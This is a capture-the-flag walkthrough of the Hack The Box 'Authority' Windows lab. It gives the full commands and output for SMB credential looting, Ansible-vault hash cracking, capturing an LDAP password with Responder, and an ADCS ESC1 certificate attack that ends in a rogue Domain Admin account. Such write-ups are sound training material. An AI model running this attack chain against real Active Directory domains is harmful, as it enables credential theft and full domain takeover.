
# Authority

Authority is a easy HTB lab that focuses on active directory, sensitive information disclosure and privilege escalation. In this walkthrough, we will go over the process of exploiting the services and gaining access to the root user.

<!-- toc -->

### Recon

The first step in any penetration testing process is reconnaissance. We can start by running nmap scan on the target machine to identify open ports and services.

```
$ sudo nmap -p- -sV 10.129.71.255

Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-24 02:46 BST
Stats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 62.59% done; ETC: 02:47 (0:00:27 remaining)
Nmap scan report for 10.129.71.255
Host is up (0.081s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-29 09:49:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-10-29T09:50:29+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername:<unsupported>, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8443/tcp  open  ssl/https-alt
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Taking a look at the headers from website:
```
$ curl -I 10.129.71.255

HTTP/1.1 200 OK
Content-Length: 703
Content-Type: text/html
Last-Modified: Tue, 09 Aug 2022 23:00:33 GMT
Accept-Ranges: bytes
ETag: "557c50d443acd81:0"
Server: Microsoft-IIS/10.0
Date: Tue, 24 Oct 2023 05:46:45 GMT
```

Trying to get the list of the usersname using `rid-brute` on the website.
```
$ crackmapexec smb --rid-brute -u test -p '' -- authority.htb

[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing FTP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing RDP protocol database
[*] Initializing SSH protocol database
[*] Initializing SMB protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         authority.htb   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         authority.htb   445    AUTHORITY        [+] authority.htb\test: 
SMB         authority.htb   445    AUTHORITY        [+] Brute forcing RIDs
SMB         authority.htb   445    AUTHORITY        498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         authority.htb   445    AUTHORITY        500: HTB\Administrator (SidTypeUser)
SMB         authority.htb   445    AUTHORITY        501: HTB\Guest (SidTypeUser)
SMB         authority.htb   445    AUTHORITY        502: HTB\krbtgt (SidTypeUser)
SMB         authority.htb   445    AUTHORITY        512: HTB\Domain Admins (SidTypeGroup)
SMB         authority.htb   445    AUTHORITY        513: HTB\Domain Users (SidTypeGroup)
SMB         authority.htb   445    AUTHORITY        514: HTB\Domain Guests (SidTypeGroup)
SMB         authority.htb   445    AUTHORITY        515: HTB\Domain Computers (SidTypeGroup)
SMB         authority.htb   445    AUTHORITY        516: HTB\Domain Controllers (SidTypeGroup)
SMB         authority.htb   445    AUTHORITY        517: HTB\Cert Publishers (SidTypeAlias)
SMB         authority.htb   445    AUTHORITY        518: HTB\Schema Admins (SidTypeGroup)
SMB         authority.htb   445    AUTHORITY        519: HTB\Enterprise Admins (SidTypeGroup)
SMB         authority.htb   445    AUTHORITY        520: HTB\Group Policy Creator Owners (SidTypeGroup)
SMB         authority.htb   445    AUTHORITY        521: HTB\Read-only Domain Controllers (SidTypeGroup)
SMB         authority.htb   445    AUTHORITY        522: HTB\Cloneable Domain Controllers (SidTypeGroup)
SMB         authority.htb   445    AUTHORITY        525: HTB\Protected Users (SidTypeGroup)
SMB         authority.htb   445    AUTHORITY        526: HTB\Key Admins (SidTypeGroup)
SMB         authority.htb   445    AUTHORITY        527: HTB\Enterprise Key Admins (SidTypeGroup)
SMB         authority.htb   445    AUTHORITY        553: HTB\RAS and IAS Servers (SidTypeAlias)
SMB         authority.htb   445    AUTHORITY        571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         authority.htb   445    AUTHORITY        572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
SMB         authority.htb   445    AUTHORITY        1000: HTB\AUTHORITY$ (SidTypeUser)
SMB         authority.htb   445    AUTHORITY        1101: HTB\DnsAdmins (SidTypeAlias)
SMB         authority.htb   445    AUTHORITY        1102: HTB\DnsUpdateProxy (SidTypeGroup)
SMB         authority.htb   445    AUTHORITY        1601: HTB\svc_ldap (SidTypeUser)
```

Checking the access to SMB shares, we have access to and we find that we have access to `Development`. Now getting the all the data from there:
```
$ smbclient \\\\10.129.229.56\\Development
> prompt
> recurse ON
> mget *
```

Going the the files:
```
$ cat Ansible/ADCS/tox.ini 
#
# Ansible managed
#
[tox]
minversion = 3.21.4
envlist = py{310}-ansible-{4,5,6}

skipsdist = true

$ cat ansible_inventory 
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore

$ cat ansible.cfg 
[defaults]

hostfile = ansible_inventory
remote_user = svc_pwm
```

Searching for passwords using `pass`.
```
$ grep -R pass .
./ansible_inventory:ansible_password: Welcome1
./templates/tomcat-users.xml.j2:<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>  
./templates/tomcat-users.xml.j2:<user username="robot" password="T0mc@tR00t" roles="manager-script"/>
./README.md:- pwm_root_mysql_password: root mysql password, will be set to a random value by default.
./README.md:- pwm_pwm_mysql_password: pwm mysql password, will be set to a random value by default.
./README.md:- pwm_admin_password: pwm admin password, 'password' by default.
./defaults/main.yml:pwm_admin_password: !vault |
./defaults/main.yml:ldap_admin_password: !vault |
```

Checking the local ansible vault:
```
pwm_require_ssl: false

pwm_admin_login: !vault |
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438

          $ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

          $ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5

$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*


ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764

$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635


$ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531


$ansible$0*0*31356338343963323063373435363261323563393235633365356134616261666433393263373736*426d313c5809d4a80a4b9bc7d4823070*d8bad190c7fbc7c3cb1c60a27abfb0ff59d6fb73178681c7454d94a0f56a4360
```

Trying to crack the hash `hashcat -m 16900 hash.txt /usr/share/wordlists/rockyou.txt` and opening the vault with the cracked password.
```
$ cat pass.txt | ansible-vault decrypt
[DEPRECATION WARNING]: Ansible will require Python 3.8 or newer on the controller starting with Ansible 2.12. Current version: 2.7.18 (default, Jul 14 2021, 08:11:37) 
[GCC 10.2.1 20210110]. This feature will be removed from ansible-core in version 2.12. Deprecation warnings can be disabled by setting deprecation_warnings=False in 
ansible.cfg.
/home/htb-krypten/.local/lib/python2.7/site-packages/ansible/parsing/vault/__init__.py:44: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.exceptions import InvalidSignature
Vault password: 
Decryption successful
```

Using the credentials we got as `svc_pwm:pWm_@dm!N_!23`, we can access the website. 

Looking around the website, we found a page where we can add additional details and configure ldap data: `https://authority.htb:8443/pwm/private/config/manager`. Adding our IP `ldap://10.10.14.10:389/` and then doing **Test connection**.
```
$ sudo responder -I tun0

[LDAP] Cleartext Client   : 10.129.71.255
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : l************4r!
[*] Skipping previously captured cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
```

Getting the user flag:
```
$ evil-winrm -i 10.129.71.255 -u svc_ldap
Enter Password: 

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_ldap\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> type user.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```

### Privilege Escalation

Using this new credentials, we can look for certificate and any misconfiguration there.
```
$ certipy find -u svc_ldap@authority.htb -p l************4r! -dc-ip 10.129.71.255
```

From the above tool, we get the `ESC1` vulnerability is present.
```
"[!] Vulnerabilities": {
    "ESC1": "'AUTHORITY.HTB\\\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication"
}
```

Adding new computer as we can enroll that.
```
impacket-addcomputer "authority.htb/svc_ldap:l************4r!" -dc-ip 10.129.71.255 -computer-name 'Hacker123' -computer-pass 'Hacker@123'

certipy req -u 'Hacker123' -p 'Hacker@123' -ca 'AUTHORITY-CA' -target 10.129.71.255 -template 'CorpVpn' -upn "administrator@authority.htb" -dns authority.authority.htb
```

Updated the `/etc/hosts`:
```
10.129.71.255 authority.authority.htb
```

Getting the certificate and private key.
```
$ certipy req -u 'Hacker123$' -p 'Hacker@123' -ca 'AUTHORITY-CA' -target 10.129.71.255 -template 'CorpVpn' -upn "administrator@authority.htb" -dns authority.authority.htb -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve '' at '8.8.8.8'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.71.255[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.71.255[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with multiple identifications
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_authority.pfx'
```

Trying to authenticate as `administrator`.
```
$ certipy auth -pfx 'administrator_authority.pfx' -username 'administrator' -domain 'authority.htb' -dc-ip 10.129.71.255
```
Just getting the ticket for `administrator` to login didn't work.

Getting the ldap shell to add a new user named `cery_dump` and then change their password to `Cert@123`
```
$ certipy auth -pfx 'administrator_authority.pfx' -username 'administrator' -domain 'authority.htb' -dc-ip 10.129.71.255 -ldap-shell

# add_user cery_dump
Attempting to create user in: %s CN=Users,DC=authority,DC=htb
Adding new user with username: cery_dump and password: 9yepUi1>"!0Gt$C result: OK

# change_password cery_dump Cert@123
Got User DN: CN=cery_dump,CN=Users,DC=authority,DC=htb
Attempting to set new password of: Cert@123
Password changed successfully!

# add_user_to_group cery_dump 'Domain Admins'
Adding user: cery_dump to group Domain Admins result: OK
```


Getting the root flag:
```
$ evil-winrm -i 10.129.71.255 -u cery_dump
Enter Password: 

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\cery_dump\Documents> cd ../../Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```